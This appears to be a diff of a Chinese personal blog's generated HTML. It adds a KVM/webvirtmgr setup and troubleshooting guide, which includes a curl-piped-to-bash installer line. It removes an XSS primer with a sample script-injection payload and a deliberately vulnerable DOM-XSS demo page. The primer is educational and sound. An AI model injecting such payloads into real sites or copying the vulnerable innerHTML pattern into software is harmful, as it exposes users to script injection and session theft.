+<p><a target="_blank" rel="noopener" href="https://img-blog.csdnimg.cn/20190314193543699.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzY5NTEwNA==,size_16,color_FFFFFF,t_70"><img src="https://img-blog.csdnimg.cn/20190314193543699.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzY5NTEwNA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></a>点击上方的IP地址，不是点击Host：192.168.157.99</p>
+<p><strong>3.3.2 kvm存储管理</strong></p>
+<p><strong>&#x2F;&#x2F;创建存储</strong></p>
+<p><a target="_blank" rel="noopener" href="https://img-blog.csdnimg.cn/20190314193925599.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzY5NTEwNA==,size_16,color_FFFFFF,t_70"><img src="https://img-blog.csdnimg.cn/20190314193925599.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzY5NTEwNA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></a>点击New Storage</p>
+<p><a target="_blank" rel="noopener" href="https://img-blog.csdnimg.cn/20190314194036367.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzY5NTEwNA==,size_16,color_FFFFFF,t_70"><img src="https://img-blog.csdnimg.cn/20190314194036367.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzY5NTEwNA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></a>****</p>
+<p><strong>进入存储</strong> <a target="_blank" rel="noopener" href="https://img-blog.csdnimg.cn/20190314194133477.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzY5NTEwNA==,size_16,color_FFFFFF,t_70"><img src="https://img-blog.csdnimg.cn/20190314194133477.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzY5NTEwNA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></a>点击default</p>
+<p><a target="_blank" rel="noopener" href="https://img-blog.csdnimg.cn/20190314194253161.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzY5NTEwNA==,size_16,color_FFFFFF,t_70"><img src="https://img-blog.csdnimg.cn/20190314194253161.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzY5NTEwNA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></a>池路径 &#x2F;var&#x2F;lib&#x2F;libvirt&#x2F;images：磁盘镜像ISO文件存储的位置</p>
+<p><strong>&#x2F;&#x2F;通过远程连接软件上传ISO镜像文件至存储目录&#x2F;var&#x2F;lib&#x2F;libvirt&#x2F;images&#x2F;</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">[root@mp ~]# cd /var/lib/libvirt/images/</span><br><span class="line">[root@mp images]# ll</span><br><span class="line">总用量 3963904</span><br><span class="line">-rw-r--r-- 1 root root 4059037696 3月  15 03:50 rhel-server-7.4-x86_64-dvd.iso</span><br></pre></td></tr></table></figure>
+
+<p><strong>&#x2F;&#x2F;在web界面查看ISO镜像文件是否存在</strong> <a target="_blank" rel="noopener" href="https://img-blog.csdnimg.cn/20190314195305198.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzY5NTEwNA==,size_16,color_FFFFFF,t_70"><img src="https://img-blog.csdnimg.cn/20190314195305198.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzY5NTEwNA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></a></p>
+<p><strong>&#x2F;&#x2F;创建系统安装镜像</strong> <a target="_blank" rel="noopener" href="https://img-blog.csdnimg.cn/20190314195505238.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzY5NTEwNA==,size_16,color_FFFFFF,t_70"><img src="https://img-blog.csdnimg.cn/20190314195505238.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzY5NTEwNA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></a></p>
+<p><strong>&#x2F;&#x2F;添加成功如下图</strong> <a target="_blank" rel="noopener" href="https://img-blog.csdnimg.cn/20190314195604723.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzY5NTEwNA==,size_16,color_FFFFFF,t_70"><img src="https://img-blog.csdnimg.cn/20190314195604723.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzY5NTEwNA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></a></p>
+<p><strong>3.3.3 kvm网络管理</strong></p>
+<p><a target="_blank" rel="noopener" href="https://img-blog.csdnimg.cn/20190314195711201.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzY5NTEwNA==,size_16,color_FFFFFF,t_70"><img src="https://img-blog.csdnimg.cn/20190314195711201.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzY5NTEwNA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></a>点击New Network</p>
+<p><a target="_blank" rel="noopener" href="https://img-blog.csdnimg.cn/2019031419593859.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzY5NTEwNA==,size_16,color_FFFFFF,t_70"><img src="https://img-blog.csdnimg.cn/2019031419593859.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzY5NTEwNA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></a><strong>3.3.4 实例管理</strong></p>
+<p><strong>实例（虚拟机的创建）</strong> <a target="_blank" rel="noopener" href="https://img-blog.csdnimg.cn/20190314200516947.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzY5NTEwNA==,size_16,color_FFFFFF,t_70"><img src="https://img-blog.csdnimg.cn/20190314200516947.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzY5NTEwNA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></a></p>
+<p><strong>&#x2F;&#x2F;虚拟机插入光盘</strong></p>
+<p><a target="_blank" rel="noopener" href="https://img-blog.csdnimg.cn/20190314200608305.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzY5NTEwNA==,size_16,color_FFFFFF,t_70"><img src="https://img-blog.csdnimg.cn/20190314200608305.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzY5NTEwNA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></a></p>
+<p><strong>&#x2F;&#x2F;设置在web上访问虚拟机的密码</strong></p>
+<p><a target="_blank" rel="noopener" href="https://img-blog.csdnimg.cn/20190314200729314.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzY5NTEwNA==,size_16,color_FFFFFF,t_70"><img src="https://img-blog.csdnimg.cn/20190314200729314.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzY5NTEwNA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></a></p>
+<p><strong>&#x2F;&#x2F;启动虚拟机</strong></p>
+<p><a target="_blank" rel="noopener" href="https://img-blog.csdnimg.cn/20190314200838724.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzY5NTEwNA==,size_16,color_FFFFFF,t_70"><img src="https://img-blog.csdnimg.cn/20190314200838724.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzY5NTEwNA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></a><a target="_blank" rel="noopener" href="https://img-blog.csdnimg.cn/20190314200917131.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzY5NTEwNA==,size_16,color_FFFFFF,t_70"><img src="https://img-blog.csdnimg.cn/20190314200917131.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzY5NTEwNA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></a></p>
+<p><strong>&#x2F;&#x2F;虚拟机安装</strong></p>
+<p><a target="_blank" rel="noopener" href="https://img-blog.csdnimg.cn/2019031420163376.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzY5NTEwNA==,size_16,color_FFFFFF,t_70"><img src="https://img-blog.csdnimg.cn/2019031420163376.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzY5NTEwNA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></a>此步骤为虚拟机的安装步骤，不再阐述</p>
+<p>*<strong>5*</strong>|<strong>*0**<em><strong>4. 所遇问题</strong></em>**5*</strong>|***1***<strong>4.1 故障一</strong></p>
+<p>第一次通过web访问kvm时可能会一直访问不了，一直转圈，而命令行界面一直报错(too many open files)</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">永久生效方法：</span><br><span class="line">	修改/etc/security/limits.conf，在文件底部添加：</span><br><span class="line">	* soft nofile 655360</span><br><span class="line">	* hard nofile 655360</span><br><span class="line">	星号代表全局， soft为软件，hard为硬件，nofile为这里指可打开文件数。</span><br><span class="line"> </span><br><span class="line">另外，要使limits.conf文件配置生效，必须要确保 pam_limits.so 文件被加入到启动文件中。</span><br><span class="line">查看 /etc/pam.d/login 文件中有：</span><br><span class="line">session required /lib/security/pam_limits.so</span><br></pre></td></tr></table></figure>
+
+<p>*<strong>5*</strong>|***2***<strong>4.2 故障二</strong></p>
+<p>web界面配置完成后可能会出现以下错误界面 <a target="_blank" rel="noopener" href="https://img-blog.csdnimg.cn/20190318150017680.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzY5NTEwNA==,size_16,color_FFFFFF,t_70"><img src="https://img-blog.csdnimg.cn/20190318150017680.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzY5NTEwNA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></a> 解决方法是安装novnc并通过novnc_server启动一个vnc</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">[root@mp ~]# ll /etc/rc.local</span><br><span class="line">lrwxrwxrwx. 1 root root 13 Aug  6  2018 /etc/rc.local -&amp;gt; rc.d/rc.local</span><br><span class="line">[root@mp ~]# ll /etc/rc.d/rc.local</span><br><span class="line">-rw-r--r-- 1 root root 513 Mar 11 22:35 /etc/rc.d/rc.local</span><br><span class="line">[root@mp ~]# chmod +x /etc/rc.d/rc.local</span><br><span class="line">[root@mp ~]# ll /etc/rc.d/rc.local</span><br><span class="line">-rwxr-xr-x 1 root root 513 Mar 11 22:35 /etc/rc.d/rc.local</span><br><span class="line"></span><br><span class="line">[root@mp ~]# vim /etc/rc.d/rc.local</span><br><span class="line">......此处省略N行</span><br><span class="line"># that this script will be executed during boot.</span><br><span class="line"></span><br><span class="line">touch /var/lock/subsys/local</span><br><span class="line">nohup novnc_server 172.16.12.128:5920 &amp;amp;</span><br><span class="line"></span><br><span class="line">[root@mp ~]# . /etc/rc.d/rc.local</span><br></pre></td></tr></table></figure>
+
+<h1 id="安装yay-aur包管理器"><a href="#安装yay-aur包管理器" class="headerlink" title="安装yay aur包管理器"></a>安装yay aur包管理器</h1><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">git <span class="built_in">clone</span> https://aur.archlinux.org/yay-bin.git</span><br><span class="line"><span class="built_in">cd</span> yay-bin</span><br><span class="line">makepkg -si </span><br></pre></td></tr></table></figure>
+
+<h1 id="通过aur安装"><a href="#通过aur安装" class="headerlink" title="通过aur安装"></a>通过aur安装</h1><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">yay -S webvirtmgr-git</span><br><span class="line">yaourt -S webvirtmgr-git</span><br></pre></td></tr></table></figure>
+
+<h1 id="如果连接失败"><a href="#如果连接失败" class="headerlink" title="如果连接失败"></a>如果连接失败</h1><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">可以使用wattlk也就是steam++</span><br><span class="line">命令如下</span><br><span class="line">curl -sSL https://steampp.net/Install/Linux.sh | bash</span><br><span class="line">然后在尝试</span><br></pre></td></tr></table></figure>
+
+<h1 id="采用命令行自带的管理进行安装虚拟机"><a href="#采用命令行自带的管理进行安装虚拟机" class="headerlink" title="采用命令行自带的管理进行安装虚拟机"></a>采用命令行自带的管理进行安装虚拟机</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">这steam++速度也不是很行</span><br></pre></td></tr></table></figure>
+
+<p>centos debian</p>
+<h1 id="archlinux牵扯问题："><a href="#archlinux牵扯问题：" class="headerlink" title="archlinux牵扯问题："></a>archlinux牵扯问题：</h1><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">内核加载等，我不想折腾了。于是选择更换稳定的发行版。</span><br><span class="line">用<span class="built_in">arch</span>做服务器是我今年做过最愚蠢的事情之一了</span><br></pre></td></tr></table></figure>
+
+
+          
+        
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
     <link itemprop="mainEntityOfPage" href="http://example.com/2023/12/26/csrf/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -1487,731 +1994,6 @@
 
 
     
-      
-
-  
-
-  
-  
-  
-
-  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
-  
-  
-  
-  <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://example.com/2023/12/26/xss/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="name" content="">
-      <meta itemprop="description" content="">
-      <meta itemprop="image" content="/images/head.webp">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="frozenfish'blog">
-    </span>
-
-    
-      <header class="post-header">
-
-        
-        
-          <h1 class="post-title" itemprop="name headline">
-                
-                <a class="post-title-link" href="/2023/12/26/xss/" itemprop="url">xss</a></h1>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">发表于</span>
-              
-              <time title="创建于" itemprop="dateCreated datePublished" datetime="2023-12-26T02:01:50+08:00">
-                2023-12-26
-              </time>
-            
-
-            
-
-            
-          </span>
-
-          
-
-          
-            
-          
-
-          
-          
-
-          
-
-          
-
-          
-
-        </div>
-      </header>
-    
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-      
-
-      
-        
-          
-            <p>xss</p>
-<hr>
-<p>[TOC]</p>
-<h1 id="xss分类"><a href="#xss分类" class="headerlink" title="xss分类"></a>xss分类</h1><h2 id="1-反射型XSS"><a href="#1-反射型XSS" class="headerlink" title="1.反射型XSS"></a>1.反射型XSS</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">反射型XSS是比较常见和广泛的一类，举例来说，当一个网站的代码中包含类似下面的语句：</span><br><span class="line">&lt;?php echo &quot;&lt;p&gt;hello, $_GET[&#x27;user&#x27;]&lt;/p&gt;&quot;;?&gt; ，</span><br><span class="line">那么在访问时设置 </span><br><span class="line">	/?user=&lt;/p&gt;&lt;script&gt;alert(&quot;hack&quot;)&lt;/script&gt;&lt;p&gt; ，</span><br><span class="line">    则可执行预设好的JavaScript代码。</span><br><span class="line"></span><br><span class="line">反射型XSS通常出现在搜索等功能中，需要被攻击者点击对应的链接才能触发，且受到XSS Auditor、NoScript等防御手段的影响较大。</span><br></pre></td></tr></table></figure>
-
-<h2 id="2-储存型xss"><a href="#2-储存型xss" class="headerlink" title="2.储存型xss"></a>2.储存型xss</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">储存型XSS相比反射型来说危害较大，在这种漏洞中，攻击者能够把攻击载荷存入服务器的数据库中，造成持久化的攻击。</span><br></pre></td></tr></table></figure>
-
-<h2 id="3-dom-xss"><a href="#3-dom-xss" class="headerlink" title="3.dom xss"></a>3.dom xss</h2><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">DOM型XSS不同之处在于DOM型XSS一般和服务器的解析响应没有直接关系，而是在JavaScript脚本动态执行的过程中产生的。</span><br><span class="line"></span><br><span class="line">例如：</span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">title</span>&gt;</span>DOM Based XSS Demo<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript"><span class="keyword">function</span> <span class="title function_">xsstest</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="language-javascript">&#123;</span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">var</span> str = <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&quot;input&quot;</span>).<span class="property">value</span>;</span></span><br><span class="line"><span class="language-javascript">    <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&quot;output&quot;</span>).<span class="property">innerHTML</span> = <span class="string">&quot;&lt;img src=&#x27;&quot;</span>+str+<span class="string">&quot;&#x27;&gt;&lt;/img&gt;&quot;</span>;</span></span><br><span class="line"><span class="language-javascript">&#125;</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;output&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">id</span>=<span class="string">&quot;input&quot;</span> <span class="attr">size</span>=<span class="string">50</span> <span class="attr">value</span>=<span class="string">&quot;&quot;</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;button&quot;</span> <span class="attr">value</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">onclick</span>=<span class="string">&quot;xsstest()&quot;</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>
-
-<h2 id="4-Blind-XSS"><a href="#4-Blind-XSS" class="headerlink" title="4.Blind XSS"></a>4.Blind XSS</h2><p>Blind XSS是储存型XSS的一种，它保存在某些存储中，当一个“受害者”访问这个页面时执行，并且在文档对象模型(DOM)中呈现payload。 它被称为Blind的原因是因为它通常发生在通常不暴露给用户的功能上。</p>
-<h1 id="xss作用"><a href="#xss作用" class="headerlink" title="xss作用"></a>xss作用</h1><p>存在XSS漏洞时，可能会导致以下几种情况：</p>
-<ol>
-<li>用户的Cookie被获取，其中可能存在Session ID等敏感信息。若服务器端没有做相应防护，攻击者可用对应Cookie登陆服务器。</li>
-<li>攻击者能够在一定限度内记录用户的键盘输入。</li>
-<li>攻击者通过CSRF等方式以用户身份执行危险操作。</li>
-<li>XSS蠕虫。</li>
-<li>获取用户浏览器信息。</li>
-<li>利用XSS漏洞扫描用户内网。</li>
-</ol>
-<h1 id="同源策略"><a href="#同源策略" class="headerlink" title="同源策略"></a>同源策略</h1><h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>同源策略限制了不同源之间如何进行资源交互，是用于隔离潜在恶意文件的重要安全机制。 是否同源由URL决定，URL由协议、域名、端口和路径组成，如果两个URL的协议、域名和端口相同，则表示他们同源。</p>
-<h3 id="file域的同源策略"><a href="#file域的同源策略" class="headerlink" title="file域的同源策略"></a>file域的同源策略</h3><p>在之前的浏览器中，任意两个file域的URI被认为是同源的。本地磁盘上的任何HTML文件都可以读取本地磁盘上的任何其他文件。</p>
-<p>从Gecko 1.9开始，文件使用了更细致的同源策略，只有当源文件的父目录是目标文件的祖先目录时，文件才能读取另一个文件。</p>
-<h3 id="cookie的同源策略"><a href="#cookie的同源策略" class="headerlink" title="cookie的同源策略"></a>cookie的同源策略</h3><p>cookie使用不同的源定义方式，一个页面可以为本域和任何父域设置cookie，只要是父域不是公共后缀(public suffix)即可。</p>
-<p>不管使用哪个协议(HTTP&#x2F;HTTPS)或端口号，浏览器都允许给定的域以及其任何子域名访问cookie。设置 cookie时，可以使用 <code>domain</code> &#x2F; <code>path</code> &#x2F; <code>secure</code> 和 <code>http-only</code> 标记来限定其访问性。</p>
-<p>所以 <code>https://localhost:8080/</code> 和 <code>http://localhost:8081/</code> 的Cookie是共享的。</p>
-<h3 id="Flash-SilverLight跨域"><a href="#Flash-SilverLight跨域" class="headerlink" title="Flash&#x2F;SilverLight跨域"></a>Flash&#x2F;SilverLight跨域</h3><p>浏览器的各种插件也存在跨域需求。通常是通过在服务器配置crossdomain.xml，设置本服务允许哪些域名的跨域访问。</p>
-<p>客户端会请求此文件，如果发现自己的域名在访问列表里，就发起真正的请求，否则不发送请求。</p>
-<h3 id="源的更改"><a href="#源的更改" class="headerlink" title="源的更改"></a>源的更改</h3><p>同源策略认为域和子域属于不同的域，例如 <code>child1.a.com</code> 与 <code>a.com</code> &#x2F; <code>child1.a.com</code> 与 <code>child2.a.com</code> &#x2F; <code>xxx.child1.a.com</code> 与 <code>child1.a.com</code> 两两不同源。</p>
-<p>对于这种情况，可以在两个方面各自设置 <code>document.domain=&#39;a.com&#39;</code> 来改变其源来实现以上任意两个页面之间的通信。</p>
-<p>另外因为浏览器单独保存端口号，这种赋值会导致端口号被重写为 <code>null</code> 。</p>
-<h1 id="跨源访问"><a href="#跨源访问" class="headerlink" title="跨源访问"></a>跨源访问</h1><p>同源策略控制了不同源之间的交互，这些交互通常分为三类：</p>
-<h2 id="通常允许跨域写操作-Cross-origin-writes"><a href="#通常允许跨域写操作-Cross-origin-writes" class="headerlink" title="通常允许跨域写操作(Cross-origin writes)"></a>通常允许跨域写操作(Cross-origin writes)</h2><ul>
-<li><p>链接(links)重定向表单提交</p>
-</li>
-<li><p>通常允许跨域资源嵌入(Cross-origin embedding)</p>
-</li>
-<li><p>通常不允许跨域读操作(Cross-origin reads)</p>
-</li>
-</ul>
-<p>可能嵌入跨源的资源的一些示例有：</p>
-<ul>
-<li><code>&lt;script src=&quot;...&quot;&gt;&lt;/script&gt;</code> 标签嵌入跨域脚本。语法错误信息只能在同源脚本中捕捉到。</li>
-<li><code>&lt;link rel=&quot;stylesheet&quot; href=&quot;...&quot;&gt;</code> 标签嵌入CSS。由于CSS的松散的语法规则，CSS的跨域需要一个设置正确的Content-Type 消息头。</li>
-<li><code>&lt;img&gt;</code> &#x2F; <code>&lt;video&gt;</code> &#x2F; <code>&lt;audio&gt;</code> 嵌入多媒体资源。</li>
-<li><code>&lt;object&gt;</code> <code>&lt;embed&gt;</code> 和 <code>&lt;applet&gt;</code> 的插件。</li>
-<li><code>@font-face</code> 引入的字体。一些浏览器允许跨域字体( cross-origin fonts)，一些需要同源字体(same-origin fonts)。</li>
-<li><code>&lt;frame&gt;</code> 和 <code>&lt;iframe&gt;</code> 载入的任何资源。站点可以使用X-Frame-Options消息头来阻止这种形式的跨域交互。</li>
-</ul>
-<h2 id="JSONP跨域"><a href="#JSONP跨域" class="headerlink" title="JSONP跨域"></a>JSONP跨域</h2><p>JSONP就是利用 <code>&lt;script&gt;</code> 标签的跨域能力实现跨域数据的访问，请求动态生成的JavaScript脚本同时带一个callback函数名作为参数。</p>
-<p>服务端收到请求后，动态生成脚本产生数据，并在代码中以产生的数据为参数调用callback函数。</p>
-<p>JSONP也存在一些安全问题，例如当对传入&#x2F;传回参数没有做校验就直接执行返回的时候，会造成XSS问题。没有做Referer或Token校验就给出数据的时候，可能会造成数据泄露。</p>
-<p>另外JSONP在没有设置callback函数的白名单情况下，可以合法的做一些设计之外的函数调用，引入问题。这种攻击也被称为SOME攻击。</p>
